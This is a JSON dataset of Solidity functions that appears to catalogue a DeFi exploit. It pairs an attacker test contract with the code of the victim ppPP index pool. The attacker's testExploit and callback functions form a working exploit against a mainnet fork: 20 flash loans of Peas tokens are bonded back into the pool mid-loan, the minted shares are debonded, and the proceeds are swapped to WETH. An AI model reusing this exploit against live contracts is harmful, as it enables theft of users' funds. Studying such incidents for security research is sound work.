[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "callback",
    "original_code": "    function callback(\n        bytes calldata data\n    ) external {\n        Peas.approve(address(ppPP), Peas.balanceOf(address(this)));\n        ppPP.bond(address(Peas), Peas.balanceOf(address(this)));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 19_109_653 - 1);\n        vm.label(address(DAI), \"DAI\");\n        vm.label(address(ppPP), \"ppPP\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(Peas), \"Peas\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(DAI), address(this), 200e18);\n        emit log_named_decimal_uint(\"Exploiter DAI balance before attack\", DAI.balanceOf(address(this)), DAI.decimals());\n\n        uint8 i;\n        while (i < 20) {\n            DAI.approve(address(ppPP), 10e18);\n            ppPP.flash(address(this), address(Peas), Peas.balanceOf(address(ppPP)), \"\");\n            ++i;\n        }\n\n        address[] memory token = new address[](1);\n        token[0] = address(Peas);\n        uint8[] memory percentage = new uint8[](1);\n        percentage[0] = 100;\n        ppPP.debond(ppPP.balanceOf(address(this)), token, percentage);\n        PeasToWETH();\n        emit log_named_decimal_uint(\n            \"Exploiter WETH balance after attack\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IppPP",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IppPP",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IppPP",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IppPP",
    "source_type": "victim_contract",
    "function_name": "bond",
    "original_code": "  function bond(address _token, uint256 _amount) external override noSwap {\n    require(_isTokenInIndex[_token], 'INVALIDTOKEN');\n    uint256 _tokenIdx = _fundTokenIdx[_token];\n    uint256 _tokensMinted = (_amount * FixedPoint96.Q96 * 10 ** decimals()) /\n      indexTokens[_tokenIdx].q1;\n    uint256 _feeTokens = _isFirstIn() ? 0 : (_tokensMinted * BOND_FEE) / 10000;\n    _mint(_msgSender(), _tokensMinted - _feeTokens);\n    if (_feeTokens > 0) {\n      _mint(address(this), _feeTokens);\n    }\n    for (uint256 _i; _i < indexTokens.length; _i++) {\n      uint256 _transferAmount = _i == _tokenIdx\n        ? _amount\n        : (_amount *\n          indexTokens[_i].weighting *\n          10 ** IERC20Metadata(indexTokens[_i].token).decimals()) /\n          indexTokens[_tokenIdx].weighting /\n          10 ** IERC20Metadata(_token).decimals();\n      _transferAndValidate(\n        IERC20(indexTokens[_i].token),\n        _msgSender(),\n        _transferAmount\n      );\n    }\n    emit Bond(_msgSender(), _token, _amount, _tokensMinted);\n  }\n\n  function debond(\n    uint256 _amount,\n    address[] memory,\n    uint8[] memory\n  ) external override noSwap {\n    uint256 _amountAfterFee = _isLastOut(_amount)\n      ? _amount\n      : (_amount * (10000 - DEBOND_FEE)) / 10000;\n    uint256 _percAfterFeeX96 = (_amountAfterFee * FixedPoint96.Q96) /\n      totalSupply();\n    _transfer(_msgSender(), address(this), _amount);\n    _burn(address(this), _amountAfterFee);\n    for (uint256 _i; _i < indexTokens.length; _i++) {\n      uint256 _tokenSupply = IERC20(indexTokens[_i].token).balanceOf(\n        address(this)\n      );\n      uint256 _debondAmount = (_tokenSupply * _percAfterFeeX96) /\n        FixedPoint96.Q96;\n      IERC20(indexTokens[_i].token).safeTransfer(_msgSender(), _debondAmount);\n      require(\n        IERC20(indexTokens[_i].token).balanceOf(address(this)) >=\n          _tokenSupply - _debondAmount,\n        'HEAVY'\n      );\n    }\n    emit Debond(_msgSender(), _amount);\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IppPP",
    "source_type": "victim_contract",
    "function_name": "debond",
    "original_code": "  function debond(\n    uint256 _amount,\n    address[] memory,\n    uint8[] memory\n  ) external override noSwap {\n    uint256 _amountAfterFee = _isLastOut(_amount)\n      ? _amount\n      : (_amount * (10000 - DEBOND_FEE)) / 10000;\n    uint256 _percAfterFeeX96 = (_amountAfterFee * FixedPoint96.Q96) /\n      totalSupply();\n    _transfer(_msgSender(), address(this), _amount);\n    _burn(address(this), _amountAfterFee);\n    for (uint256 _i; _i < indexTokens.length; _i++) {\n      uint256 _tokenSupply = IERC20(indexTokens[_i].token).balanceOf(\n        address(this)\n      );\n      uint256 _debondAmount = (_tokenSupply * _percAfterFeeX96) /\n        FixedPoint96.Q96;\n      IERC20(indexTokens[_i].token).safeTransfer(_msgSender(), _debondAmount);\n      require(\n        IERC20(indexTokens[_i].token).balanceOf(address(this)) >=\n          _tokenSupply - _debondAmount,\n        'HEAVY'\n      );\n    }\n    emit Debond(_msgSender(), _amount);\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IppPP",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view virtual returns (uint8) {\n        return _decimals;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IppPP",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IppPP",
    "source_type": "victim_contract",
    "function_name": "flash",
    "original_code": "  function flash(\n    address _recipient,\n    address _token,\n    uint256 _amount,\n    bytes calldata _data\n  ) external override {\n    address _rewards = StakingPoolToken(lpStakingPool).poolRewards();\n    IERC20(DAI).safeTransferFrom(\n      _msgSender(),\n      _rewards,\n      FLASH_FEE_DAI * 10 ** IERC20Metadata(DAI).decimals()\n    );\n    uint256 _balance = IERC20(_token).balanceOf(address(this));\n    IERC20(_token).safeTransfer(_recipient, _amount);\n    IFlashLoanRecipient(_recipient).callback(_data);\n    require(IERC20(_token).balanceOf(address(this)) >= _balance, 'FLASHAFTER');\n    emit FlashLoan(_msgSender(), _recipient, _token, _amount);\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IppPP",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IppPP",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IppPP",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IppPP",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IppPP",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IppPP",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IppPP",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IUniswapV3Router",
    "source_type": "victim_contract",
    "function_name": "exactInput",
    "original_code": "",
    "description": ""
  }
]